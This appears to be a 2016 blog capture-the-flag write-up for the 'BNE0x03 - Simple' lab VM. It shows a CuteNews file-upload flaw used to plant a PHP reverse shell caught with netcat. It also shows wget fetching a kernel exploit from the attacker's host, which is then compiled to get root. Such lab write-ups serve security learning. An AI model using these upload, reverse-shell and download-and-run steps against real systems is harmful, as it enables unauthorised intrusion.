@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>BNE0x03 - Simple - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2016-04-16">April 16, 2016</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/sectalks">sectalks</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">BNE0x03 - Simple</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<h3 id="simple-ctf:bec3ed8ba720b9073ab75abcf3ba5d97">Simple CTF</h3>
+
+<p>Simple CTF is a boot2root that focuses on the basics of web based hacking.  /root/flag.txt is your ultimate goal.</p>
+
+<h3 id="hints:bec3ed8ba720b9073ab75abcf3ba5d97">Hints</h3>
+
+<ul>
+<li>Get a user shell by uploading a reverse shell and executing it.</li>
+<li>A proxy may help you to upload the file you want, rather than the file that the server expects.</li>
+<li>There are 3 known privesc exploits that work. Some people have had trouble executing one of them unless it was over a reverse shell using a netcat listener.</li>
+</ul>
+
+<h2 id="discovery:bec3ed8ba720b9073ab75abcf3ba5d97">Discovery</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -p- -A 192.168.56.104
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Please Login / CuteNews
+</code></pre>
+
+<h2 id="shell:bec3ed8ba720b9073ab75abcf3ba5d97">Shell</h2>
+
+<p>CuteNews 2.0.3 has an arbitary file upload vulnerability, in the avatar function of a registered user.  I first registered an account as <code>rasta:mouse</code> and logged in.  Navigate to <code>Personal options</code> and select the <code>Browse</code> button to upload an avatar.</p>
+
+<p>I copied <code>/usr/share/webshells\php\php-reverse-shell.php</code> to <code>/root/rasta.jpg</code>, and changed the IP address for the callback.</p>
+
+<p>Before the upload, open <code>burp</code> and turn <code>intercept</code> on.  When you upload your file, use <code>burp</code> to change the extension of the filename to <code>php</code>.  So it looks something like this:</p>
+
+<pre><code class="language-text">name=&quot;avatar_file&quot;; filename=&quot;rasta.php
+</code></pre>
+
+<p>Once the file has been uploaded, create a <code>netcat</code> listener and execute your shell.</p>
+
+<pre><code class="language-text">root@kali:~# nc -lnvp 1234
+listening on [any] 1234 ...
+
+root@kali:~# curl http://192.168.56.104/uploads/avatar_rasta_rasta.php
+
+connect to [192.168.56.102] from (UNKNOWN) [192.168.56.104] 52214
+Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
+ 08:01:39 up 37 min,  0 users,  load average: 0.00, 0.01, 0.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+</code></pre>
+
+<h2 id="priv-esc:bec3ed8ba720b9073ab75abcf3ba5d97">Priv esc</h2>
+
+<p>This VM is running Ubuntu 14.04.1, which has a kernel vulnerability that will take us straight to <code>root</code>.</p>
+
+<pre><code class="language-text">$ uname -a
+Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
+</code></pre>
+
+<p>I used <code>python -m SimpleHTTPServer</code> on my Kali box and used <code>wget</code> to download the exploit source code.  <code>gcc</code> is installed on the VM, so we can compile and run without issue.</p>
+
+<pre><code class="language-text">$ wget http://192.168.56.102:8000/x.c
+$ ls -l
+-rw-rw-rw- 1 www-data www-data 5123 Apr 16 06:20 x.c
+$ gcc x.c -o x
+$ ./x
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can't access tty; job control turned off
+# whoami
+root
+</code></pre>
+
+<h2 id="flag:bec3ed8ba720b9073ab75abcf3ba5d97">Flag</h2>
+
+<pre><code class="language-text"># cat /root/flag.txt
+U wyn teh Interwebs!!1eleven11!!1!
+Hack the planet!
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2016  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
